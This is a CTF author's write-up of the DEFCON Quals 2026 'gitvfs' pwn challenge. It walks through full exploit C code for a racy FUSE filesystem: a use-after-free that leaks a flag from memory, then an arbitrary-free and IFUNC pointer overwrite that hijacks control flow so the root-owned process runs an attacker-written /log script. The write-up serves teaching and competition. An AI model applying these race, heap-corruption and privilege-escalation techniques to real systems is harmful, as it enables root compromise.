---
title: \[DEFCON CTF QUALS 2026\] gitvfs - author writeup
author: jxuanli
pubDatetime: 2026-11-16T23:00:00.000+00:00
slug: gitvfs-defcon-34-quals
featured: false
draft: false
tags:
  - pwn
  - FUSE
description: "Exploiting a racy FUSE filesystem."
timezone: "America/Vancouver"
---

# Introduction

Most kernel pwners are probably familiar with FUSE. FUSE stands for Filesystem in USErspace. It allows an user to register a filesystem and handle specific system calls in userland. It is one technique used to extend race windows when exploiting race conditions in kernelland. For the following example, `memcpy` assumes `vuln_object` is allocated. However, without locking, the same global variable can be accessed concurrently. Furthermore, if `user_buffer` is mapped to a file belonging to a FUSE filesystem, `copy_from_user()` invokes the registered read handler in userland and waits for the handler to finish. Invoking `sleep` in the handler results in an controllable and exploitable race window. For example, if the object is freed during this window, any following accesses with result in UAFs.
```c
// in vulnerable_kernel_module.c
#define OBJ_SIZE 0x200
void *kernel_buffer; // allocated when module is loaded
int allocated = 0;
struct obj *vuln_obj = 0;

int __process_userland_data(void* user_buffer, uint size) {
  if (!allocated || !vuln_object) {
    allocated = 1;
    vuln_obj = kmalloc(OBJ_SIZE, GFP_KERNEL);
    if (!vuln_object) return -ENOMEM;
  }
  err = copy_from_user(kernel_buffer, user_buffer, size);
  if (err)
    return err;
  // ... processing the obtained data from userland
  vuln_object->buffer_size = size;
  // ...
  return 0;
}

void __free() {
  if (allocated) {
    kfree(vuln_object);
    // vuln_object = 0;
    allocated = 0;
  }
}
```

This same concept has been explored in numerous CTFs and this technique has many examples posted online. However, to my knowledge, no prior CTFs have explored possible race conditions intrinsic to FUSE filesystems. Therefore, it is a worthy topic for DEFCON to encourage players to really understand FUSE!

# Overview

[Challenge source & exploit](https://github.com/jxuanli/gitvfs)

The challenge handout includes three files: `bzImage`, `run.sh`, and `rootfs.cpio.gz`. Two files most relevant to this challenge, `gitvfs` and `init`, can be extracted from `rootfs.cpio.gz`.

`gitvfs` is intended to be a virtual filesystem that supports time travel similar to Git. Each write to a file following a previous write records the previous file buffer as an `xattr`, with md5 hash over the buffer's bytes as the key. Common filesystem operations are supported and intended to be fully functional under normal operations. In the `main` function of the binary, it allocates the `root node` and the `flag1 node` by reading the `FLAG1` environment variable (both in the `main arena`), attaches the `flag1 node` to the `root node`, and registers the filesystem.

The `init` file runs `gitvfs` with `flag1` as the environment variable and creates `flag2` at `/root/flag2`.
```bash
# in /init
FLAG1=bbb{fake_flag1} /tmp/gitvfs
echo bbb{fake_flag2} >/root/flag2
```
```
```

# The vulnerabilities

In the `gitvfs` binary, the filesystem is registered with the option, `max_threads=2`. This gives the first clue to the intended solution - it involves a **race condition**! This is further confirmed because the filesystem is initialized with `cfg->direct_io = 1` so that read and write operations are not coalesced. One vulnerable function is `free_node` because it frees the container structures (`node` and `node->file`) before entering a `for`-loop and freeing the file buffer. The `for`-loop \[1\] paired with md5 provides a window where `node` and `node->file` can be reallocated before \[2\] is reached, resulting in a dangling pointer.

Astute readers might see its resemblance of the example discussed in the introduction.

```c
void free_node(struct node *node) {
  uint8_t hash[MD5_LEN];
  md5((uint8_t *)node->name, node->namelen, hash);
  if (memcmp(hash, node->hash, MD5_LEN)) {
    return;
  }
  unlink_node(node);
  free(node);
  if (node->file->stat.st_nlink == 0) {
    free(node->file);
    for (struct record *r = node->file->records; r != NULL;) { // [1]
      struct record *next = r->next;
      md5(r->buf, r->len, hash);
      if (memcmp(hash, r->hash, MD5_LEN) == 0) {
        free(r->buf);
        free(r);
      }
      r = next;
    }
    free(node->file->buf); // [2]
  }
}
```

# `flag1`: in-process memory read

Two files, `A` and `barrier`, are created. `barrier` is used to prevent chunks from being absorbed into the `top chunk` when `A` is freed. It also serves as a spare file for allocating file buffers.

```c
#define BUF_LEN 0x10000
#define NAMELEN 0x500
// ...
inf main() {
  int fdA, fdC, barrier, err, fdV;
  char *buf, *payload;
  size_t start;

  buf = mmap(NULL, BUF_LEN * 2, PROT_READ | PROT_WRITE,
             MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  payload = buf + BUF_LEN / 2 + NAMELEN;
  memset(buf, 0, BUF_LEN);
  chk(mkdir("a", 0755));
  memset(buf, 'a', NAMELEN);
  buf[1] = '/';
  fdA = chk(open(buf, O_CREAT | O_RDWR, 0666));
  barrier = chk(open("barrier", O_CREAT | O_RDWR, 0666));
  sleep(2);
  // ...
}
```

Then, file `C` is created and written while `A` is unlinked in a separate process, **racing the `unlink` (file `A`) and `create` + `write` (file `C`) operations**. `A` and `C` need to be located in different directories because `libfuse` and the `FUSE` kernel module have additional lockings. To extend the race window, `A` is written to with `0x20000` bytes of data `11` times. When `unlink` invokes `free_node()`, the `for`-loop \[1\] takes a long time to finish, allowing the race condition to be reliably and controllably triggered.

```c
int main() {
  // ...
  for (int i = 0; i < 11; i++) {
    chk(write(fdA, buf, BUF_LEN * 2));
  }
  // close the file descriptor before unlinking to prevent temporary files
  // (.fuse_hidden) from being created
  chk(close(fdA));

  if (!fork()) {
    memset(buf, 'a', NAMELEN);
    buf[1] = '/';
    chk(unlink(buf));
    return 0;
  }
  usleep(200000);

  memset(buf, 0, BUF_LEN);
  memset(buf, 'c', NAMELEN);
  fdC = chk(open(buf, O_CREAT | O_RDWR, 0666));
  write(fdC, buf, NAMELEN + 0x50);
  close(fdC);
  sleep(5);
  // ...
}
```

The numbers used are tuned to consistently achieve the following sequence of events. Most importantly, **the thread in which `A` is allocated should be the same thread in which `C` is allocated**. We see the file buffer allocated at \[3\] is freed at \[4\]. The following log was written to `/log` when `DEBUG` mode was enabled (see the source code). (As it turns out, `/log` is also an important piece for obtaining `flag2`.)
```
[305.309] 7fc50b63e6c0 @ 0x7fc504001960: alloc (aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[305.312] 7fc50b63e6c0 @ 0x7fc5040011c0: alloc (barrier)
[307.322] 7fc50ad3b6c0 @ 0x7fc50a418010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.329] 7fc50b63e6c0 @ 0x7fc50a3d7010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.346] 7fc50ad3b6c0 @ 0x7fc50a376010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.363] 7fc50b63e6c0 @ 0x7fc50a2f5010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.384] 7fc50ad3b6c0 @ 0x7fc50a254010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.411] 7fc50b63e6c0 @ 0x7fc50a193010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.444] 7fc50ad3b6c0 @ 0x7fc50a0b2010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.483] 7fc50b63e6c0 @ 0x7fc509fb1010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.529] 7fc50ad3b6c0 @ 0x7fc509e90010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.582] 7fc50b63e6c0 @ 0x7fc509d4f010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.641] 7fc50ad3b6c0 @ 0x7fc509bee010: write (/a/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.707] 7fc50ad3b6c0 @ 0x7fc504001960: free (aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.708] 7fc50ad3b6c0 @ 0x7fc504002090: free (aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[307.767] 7fc50ad3b6c0 @ 0x7fc509d4f010: free (rbuffer)
[307.821] 7fc50ad3b6c0 @ 0x7fc509e90010: free (rbuffer)
[307.871] 7fc50ad3b6c0 @ 0x7fc509fb1010: free (rbuffer)
[307.907] 7fc50b63e6c0 @ 0x7fc504001960: alloc (cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
[307.908] 7fc50b63e6c0 @ 0x7fc504003370: write (/ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc # [3]
[307.913] 7fc50ad3b6c0 @ 0x7fc50a0b2010: free (rbuffer)
[307.949] 7fc50ad3b6c0 @ 0x7fc50a193010: free (rbuffer)
[307.979] 7fc50ad3b6c0 @ 0x7fc50a254010: free (rbuffer)
[308.004] 7fc50ad3b6c0 @ 0x7fc50a2f5010: free (rbuffer)
[308.022] 7fc50ad3b6c0 @ 0x7fc50a376010: free (rbuffer)
[308.034] 7fc50ad3b6c0 @ 0x7fc50a3d7010: free (rbuffer)
[308.041] 7fc50ad3b6c0 @ 0x7fc50a418010: free (rbuffer)
[308.041] 7fc50ad3b6c0 @ 0x7fc504003370: free (filebuffer) # [4]
```

File `V` is created to reclaim the freed file buffer such that the `node` of `V` and the file buffer of `C` now overlap. Reading `C` leaks an address of the `file` struct corresponding to the root directory allocated in the `main arena` where `flag1` resides. The offset is obtained through debugging. **Note that the exact offset changes depending on the size of the flag.**

```c
int main() {
  // ...
  write(barrier, buf, NAMELEN + 0x50);
  // create V to reclaim the freed file buffer
  // essentially the node struct of V and the file buffer of C now overlaps
  memset(buf, 'v', NAMELEN);
  fdV = chk(open(buf, O_CREAT | O_RDWR, 0666));
  write(fdV, buf, NAMELEN + 0x50);
  write(fdV, buf, NAMELEN + 0x50);

  sleep(2);
  memset(buf, 0, BUF_LEN);
  memset(buf, 'c', 0x500);
  fdC = chk(open(buf, O_CREAT | O_RDWR, 0666));
  err = chk(read(fdC, payload, 0x100));
  // just read the node struct of V
  hexdump(payload, 0x50);
  ulong flag1 = *((ulong *)payload + 3) + 0x100;
#ifdef REMOTE
  flag1 += 0x140;
#endif
  printf("flag1 @ %p\n", (void *)flag1);
  sleep(1);
  close(fdC);
  // ...
}
```

After computing the location of `file` struct corresponding to `flag1`, `C`'s file buffer is freed and reallocated to **create a fake `file` struct** (with user's `mode`, `uid`, etc) and **overwrite the `node` of `V` with the fake `file` pointer** \[7\]. Then, we can simply read `V` and print `flag1`.

```c
int main() {
  // ...  
  unlink(buf); // free the file buffer of C

  // construct a fake node struct
  memset(payload + 0x50, 0, 0x300);
  ulong fakefile =
      *((ulong *)payload + 7) +
      0x1ce0; // start of the fake struct, offset obtained through debugging
  printf("fakefile @ %p\n", (void *)fakefile);
  *((ulong *)payload + 0) = 0xd55b679bd169369e; // hash of 'v'
  *((ulong *)payload + 1) = 0x2a5d206446fd5870;
  *((ulong *)payload + 2) = 1;
  *((ulong *)payload + 4) = 0;
  *((ulong *)payload + 7) = fakefile;
#ifdef FLAG2
  // fake chunk 1
  *((ulong *)payload + 25 - FAKESZ / 8) = FAKESZ | 1;
  *((ulong *)payload + 26 - FAKESZ / 8) = 0x04b2008fd98c1dd4; // hash of all 0s
  *((ulong *)payload + 27 - FAKESZ / 8) = 0x7e42f8ec980980e9;
#endif
  *((ulong *)payload + 25) = 0xa1; // fakefile
  *((ulong *)payload + 28) = 1;
  *((ulong *)payload + 29) = 0x00000539000081a4;
  *((ulong *)payload + 30) = 0x000000000000fffd;
  *((ulong *)payload + 32) = 0x100;
  *((ulong *)payload + 44) = flag1; // the file buffer
#ifdef FLAG2
  // fake chunk 2
  // this can also be extended to a primitive where you can arbitrarily free an
  // essentially arbitrary amount of pointers - but two is enough
  *((ulong *)payload + 46) = fakefile + 0xb0;
  *((ulong *)payload + 47) = FAKESZ | 1;
  *((ulong *)payload + 48) = 0x04b2008fd98c1dd4;
  *((ulong *)payload + 49) = 0x7e42f8ec980980e9;
  *((ulong *)payload + 52) = fakefile - FAKESZ;
  *((ulong *)payload + 47 + FAKESZ / 8) = FAKESZ | 1;
  *((ulong *)payload + 129) = FAKESZ | 1;
#endif
  payload[0x41] = 0;
  payload -= 0x10;
  *((ulong *)payload + 1) = 0x411;
  // reclaim the freed chunk and overwrite the node struct of V
  buf[0] = 'c';
  buf[1] = 0;
  fdC = chk(open(buf, O_RDWR | O_CREAT, 0666));
  for (int i = 0; i < 2; i++) {
    // a light heap spray -
    // one of them will achieve the reclaimation and overwrite
    chk(lseek(fdC, NAMELEN, SEEK_SET));
    chk(write(fdC, payload, NAMELEN)); // [7]
  }
  sleep(1);
  buf[0] = 'v';
  fdV = chk(open(buf, O_RDWR));
  chk(read(fdV, buf, 0x100));
  printf("flag1: %s\n", buf);
  close(fdV);
  // ...
}

```
`flag1: bbb{s0_y0U_r3@Lly_und3rSt0od_h0w_FUSE_w0rkS}`

# `flag2`: privileged file read

`flag2` is located at `/root/flag2` and owned by `root`. `ps -e` shows that the `gitvfs` process is also owned by `root`. Therefore, one approach is to **run arbitrary commands as root through this process**.


Through the full control over a freed `node` struct (specifically the `record` chain), a arbitrary free primitive of an arbitrary amount (though two is enough) of pointers can be constructed. The `payload` in the above code snippet constructs the following layout on the heap.

```
  [ (fake) node struct of V sized 0x410
      [ fake record1 sized FAKESZ ] <--| (FAKESZ = 0x60)
      [ fake file ]                    |
      [ fake record2 sized FAKESZ ] -->|
  ]
```

All of those structures can be freed by unlinking `V`. Then, the freed `node` struct is read and overwritten back by writing to `C` with the next pointer of the `free record1` changed to `IFUNC` section which will be overwritten next. Trials and errors show that overwriting the function pointer located at `0x51f0d0` (`= IFUNC`) results in control flow hijacking (CFH) during the same `write` operation in which `IFUNC` memory is overwritten.

```
  [ file buffer sized 0x410 (originally the node struct of V)
      [ free fake record1 ] -------> 0x51f0d0 (IFUNC section)
      [ free fake struct ]     x
      [ free fake record2 ] <--x (before the overwrite, free record1 points to free record2)
  ]
```


```c
int main() {
  // ...
  chk(unlink("v"));

  buf[0] = 'c';
  buf[1] = 0;
  fdC = chk(open(buf, O_RDWR));
  chk(lseek(fdC, NAMELEN, SEEK_SET));
  memset(payload, 0xff, PAYLOAD_READ_SZ);
  err = chk(read(fdC, payload, PAYLOAD_READ_SZ));

  // this if is needed to check which write during the previous heap spray
  // succeeded (one of them did)
  if (*((ulong *)payload + 2) != *((ulong *)payload + 50) ||
      *((ulong *)payload + 2) == 0) {
    memset(payload, 0xff, PAYLOAD_READ_SZ);
    chk(listxattr("c", buf, 0x100));
    chk(getxattr("c", buf, payload - NAMELEN, 0x1000));
  }
  hexdump(payload, PAYLOAD_READ_SZ);

  // overwrite the next pointer of the chunk of the freed fake record 1 to
  // point to the elf's writable IFUNC region
  *((ulong *)payload + (28 - FAKESZ / 8)) = *((ulong *)payload + 2) ^ IFUNC;
  fdZ = chk(open("z", O_RDWR | O_CREAT, 0777));
  for (int i = 0; i < 3; i++) { // heap spray
    chk(write(fdZ, payload + 0x10, 0x400));
    lseek(fdZ, 0, SEEK_SET);
  }
  // ...
}

```

The relevant registers when the control flow is hijacked are as follows:
```
 RDX  0x7f67b8000f4f ◂— 0
 RDI  0x7f67c0266498 ◂— /* 'name of the file being written to' */
 RSI  0x7f67c0264e8c ◂— 0xb8000e5000000100
 R15  0x7f67b8000f4f ◂— 0
```

Since the content of the memory pointed to by `rdi` is controlled by the attacker, it is possible to execute an arbitrary file as root with an `execve` gadget. However, there are two problems - the file has to locate at the root directory (cannot contain \/) and `rsi` is not valid for an `execve` syscall. For the first problem, `ls -la /` reveals that `/log` with the permission `0766` and owned by root is the perfect target file. The second problem is tricker to solve because the `gitvfs.c` does not contain an apparent call to `execve`. Fortunately, `libfuse` contains code that invokes the `execve` syscall. By enumerating all of the `execve` callsites paired with the program state shown above, the following gadget proves to be useful.

```
  47bd5c:	4c 89 fe             	mov    rsi,r15
  47bd5f:	e8 bc fc ff ff       	call   47ba20 <__execve>
```

The following steps should be straight forward. First, a malicious command is written to `/log`. Then, `/mount/gitvfs/log` is created and written to in a `for`-loop to allocate out an `IFUNC` memory region, overwriting the function pointer located at `IFUNC` to be `TARGET_IP` and redirecting the control flow to `TARGET_IP`. Upon reaching the gadget, the `gitvfs` process runs `/log` as root and panics due to invalid program state.

```c
int main() {
  // ...
  int log = chk(open("/log", O_RDWR));
  write(log, CMD, sizeof(CMD));
  close(log); // cannot execve open script files (ETXTBUSY)
  log = chk(open("log", O_CREAT | O_RDWR, 0666));
  pid_t pid = fork();
  char vals[FAKESZ] = {0};
  *(ulong *)vals = TARGET_IP; // 0x47bd5c
  if (!pid) {
    for (int i = 0; i < 4; i++) {
      chk(write(log, vals, FAKESZ - 8));
      chk(lseek(log, 0, SEEK_SET));
    }
    return 0;
  }
  waitpid(pid, NULL, 0);
  // ...
}
```

Among the many useful commands, the one used in my exploit is `cat /root/flag2 > /tmp/flag2` since the goal is file read. Afterwards, a `for`-loop is used to wait for command completion. There are plenty of ways to drop to a root shell but this is left as an exercise to the reader. (Simply dropping to a shell in the `/log` file does not work. Why?)

```c
int main() {
  // ...
  for (int i = 0; i < 5; i++) {
    // use a loop to wait for the cat command to finish
    int flag2 = open("/tmp/flag2", O_RDONLY);
    if (flag2 > 0) {
      memset(buf, 0, 100);
      chk(read(flag2, buf, 0x100));
      if (buf[0] != 0) {
        printf("flag2: %s\n", buf);
        break;
      }
    }
    sleep(1);
  }
  return 0;
}
```

`flag2: bbb{th!s_h@s_alw@ys_b33n_a_k3rn3l_ch@ll_!n_d!sgu!s3!?}`

The flag is in reference to the example (more commonly seen in kernel challenges) discussed in the introduction.

# demo

```bash
/mnt/gitvfs $ /tmp/exploit
=== HEXDUMP [0x7f243549b500 - 0x7f243549b550] ===
0x7f243549b500:     0xf493b54ea9b1643e      0x7d87e1d5d1154c5b
0x7f243549b510:     0x0000000000000500      0x000000002f094980
0x7f243549b520:     0x0000000000000000      0x0000000000000000
0x7f243549b530:     0x0000000000000000      0x00007ff974001580
0x7f243549b540:     0x7676767676767676      0x7676767676767676
==========
flag1 @ 0x2f094a80
fakefile @ 0x7ff974003260
flag1: bbb{fake_flag1}
=== HEXDUMP [0x7f243549b4f0 - 0x7f243549b6f0] ===
0x7f243549b4f0:     0x0000000000000000      0x0000000000000411
0x7f243549b500:     0x00000007ff974003      0x36b3098cefb50953
0x7f243549b510:     0x0000000000000001      0x000000002f094980
0x7f243549b520:     0x0000000000000000      0x0000000000000000
0x7f243549b530:     0x0000000000000000      0x00007ff974003260
0x7f243549b540:     0x7676767676760076      0x7676767676767676
0x7f243549b550:     0x0000000000000000      0x0000000000000000
0x7f243549b560:     0x0000000000000000      0x0000000000000061
0x7f243549b570:     0x00007ffe8b977313      0x36b3098cefb50953
0x7f243549b580:     0x0000000000000000      0x0000000000000000
0x7f243549b590:     0x0000000000000000      0x0000000000000000
0x7f243549b5a0:     0x0000000000000000      0x0000000000000000
0x7f243549b5b0:     0x0000000000000000      0x0000000000000000
0x7f243549b5c0:     0x0000000000000000      0x00000000000000a1
0x7f243549b5d0:     0x00000007ff974003      0x36b3098cefb50953
0x7f243549b5e0:     0x0000000000000000      0x00000539000081a4
0x7f243549b5f0:     0x000000000000fffd      0x0000000000000000
0x7f243549b600:     0x0000000000000100      0x0000000000000000
0x7f243549b610:     0x0000000000000000      0x0000000000000000
0x7f243549b620:     0x0000000000000000      0x0000000000000000
0x7f243549b630:     0x0000000000000000      0x0000000000000000
0x7f243549b640:     0x0000000000000000      0x0000000000000000
0x7f243549b650:     0x0000000000000000      0x0000000000000000
0x7f243549b660:     0x000000002f094a80      0x0000000000000001
0x7f243549b670:     0x00007ff974003310      0x0000000000000061
0x7f243549b680:     0x00000007ff974003      0x36b3098cefb50953
0x7f243549b690:     0x0000000000000000      0x0000000000000000
0x7f243549b6a0:     0x00007ff974003200      0x0000000000000000
0x7f243549b6b0:     0x0000000000000000      0x0000000000000000
0x7f243549b6c0:     0x0000000000000000      0x0000000000000000
0x7f243549b6d0:     0x0000000000000000      0x0000000000000061
0x7f243549b6e0:     0x0000000000000000      0x0000000000000000
==========
/tmp/exploit: SYSCHK(write(log, vals, FAKESZ - 8)): Software caused connection abort: Unknown error -1
flag2: bbb{fake_flag2}
```

# after thought

Firstly, I want to thank [@xion](https://x.com/0x10n) for helping me test this challenge. I also want to thank [@ath0](https://fastb.in/) and many others for helping me setting up the infrastructure for this challenge. Since this was a multi-part challenge, additional setup was required such that resources are not wasted as this challenge was resource intensive.

During local testing, I found that the *reliability of the exploit was dependant on battery level*. The unreliability mainly originated from that heap chunks sometimes get allocated from the *undesired* thread. However, with a bit of trials-and-errors, `> 50%` reliability can be achieved. I was essentially *fighting* against two thread heaps that I had no direct control over which took a lot of debugging.

Overall, I'm proud of this challenge. It was my inaugural challenge but proved to be up to DEFCON's standards. But, there were also many things that could have been improved. For example, I will try to provide the server side setup next time (could not this time concerns that it may result in unintended solves, though some unintended solves still existed since the QEMU used had an n-day and a 0day). I will also have a Docker file used for compiling the target binary if any. In addition, I would (in retrospect) probably be fine with adding pinning CPUs in `gitvfs` so that exploits can be more reliable. However, the challenge was closer to a real world scenario without it.

Lastly, I want to congratulate the players who made a reasonable attempt on this challenge and learnt something new (regardless if you solved it or not). It was by no means easy (though there were still more solves than I anticipated).

Expect challenges that are more interesting next year!
